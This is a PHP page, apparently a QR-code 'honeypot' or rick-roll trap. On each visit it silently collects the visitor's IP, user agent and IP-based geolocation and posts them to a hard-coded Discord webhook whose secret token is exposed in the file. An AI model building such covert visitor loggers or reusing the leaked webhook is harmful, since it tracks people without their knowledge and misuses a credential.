<?php

echo <<<HTML
<pre>                                                                                                                                                                                                                                                                                                            
    █████████████████    ██          ██   ███████████  █████████████████  
    ███           ███  ████   ████████████        ███  ███           ███  
    ██            ███  ████   ████████████        ███  ███           ███  
    ██   ███████  ███    ███████     ███████    █████  ███  ███████  ███  
    ██   ███████  ███  ████   ██  ███  ████████████    ███  ███████  ███  
    ██   ███████  ███      ███  ███████     █████████  ███  ███████  ███  
    ██            ███  ██  ███         ████████   ███  ███           ███  
    ███           ███  ██  ███         ███████     ██  ███           ███  
    █████████████████  ██  ███  ██   ██   ██  ██   ██  █████████████████  
                                ██   ██   ██    ███                       
    ████████████  ████████████  ██   █████████       ██   ██  ███  ██     
    ████████████  ███████████   ██   █████████       ██  ███  ██   ██     
        ██   ████   ██  ██          ██  ███    █████  ███████       ███  
        ███     ███████    ██   ████████████████       █████                
    ██                   ███████     █████      █████     ██  ███  ██     
        ███████   █████    ██   ██  ████████████  ███           █████       
        ████████  ████     ███  ██  ████████████  ███           █████       
        █████   ██         █████  ██     █████  █████  █████  ██       ███  
        ████████  ███████           ████████    ██   ██  █████  █████       
    █████  █████       ██       ██   ███████       ██  ███████     ██     
            ███████   ██████   ██   █████  ██           ███  █████       
                ███████  ███████  ██   █████  ██           ███  █████       
    ██   █████         ██  ███    █████   ██    █████  ███████   ██  ███  
    ██     ███    ███  ███████████     █████              ██     ██       
    ██        ██       ████   ██       █████  █████       ████     ██     
    ██        ██  ██   ██     ██   ████  █████     ███████████   ███████  
    ██        ██  ██   ██     ██  █████   ████     ████████████  ███████  
                        ███████  ██            ██   ██       ████████████  
    █████████████████  ██  ███    ███  ███  █████████  ███  ███████       
    ███           ███      ███  ██   ██   ██    █████       ██       ███  
    ██   ███████  ███  ██  ███  ██   █████████    ████████████   ███████  
    ██   ███████  ███  ██  ███  ██   █████████     ███████████   ███████  
    ██   ███████  ███  ████          ██   █████████       ██  ██████████  
    ██   ███████  ███  ████   ████     █████  █████    ██████████████     
    ██            ███  ██     ██     ██  ███  ███████    ███  ███  ██     
    █████████████████  ████   ████        █████████  ██   █████████       
    █████████████████  ████   ████        █████████  ██   █████████                                                                                             
</pre>
HTML;


class Trapping {

    public function __construct() {
        // Dados para o embed
        $ip = $_SERVER['REMOTE_ADDR'] ?? 'IP desconhecido';
        $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'User-Agent desconhecido';
        $dataHora = date('Y-m-d H:i:s');

        // Geolocalização via API (ip-api.com)
        $json = file_get_contents("http://ip-api.com/json/$ip");
        $data = json_decode($json, true);
        $local = "Localização desconhecida";

        if ($data && $data['status'] === 'success') {
            $local = "{$data['city']}, {$data['regionName']} - {$data['country']} ({$data['lat']}, {$data['lon']})";
        }

        // Definindo o corpo do embed
        $embedData = [
            "username" => "Deez",
            "avatar_url" => "https://cdn.discordapp.com/avatars/1311761108117229569/f4c716ac70e9f6407bf2556869e781f1.png",
            "embeds" => [
                [
                    "id" => 800553570,
                    "title" => "Acesso a um Honey pot - Rick roll",
                    "description" => "```Navegador/SO: $userAgent```\n```Data/hora: $dataHora```\n```Localização/Próxima: $local```\n```IP: $ip```",
                    "color" => 2961718,
                    "author" => [
                        "name" => "Sistema Antonov II"
                    ]
                ]
            ]
        ];

        // Webhook do Discord
        $webhookUrl = "https://discord.com/api/webhooks/1328848093059354685/94bROrUJ6oJv9jUL-RnZUgArzxBMTxPANdlqsEpahqnV1NgQNRNjbuHPBc3ydXdia1En";

        // Enviando a requisição POST
        $options = [
            "http" => [
                "header"  => "Content-Type: application/json\r\n",
                "method"  => "POST",
                "content" => json_encode($embedData),
            ],
        ];

        $context  = stream_context_create($options);
        file_get_contents($webhookUrl, false, $context);
    }
}

new Trapping();
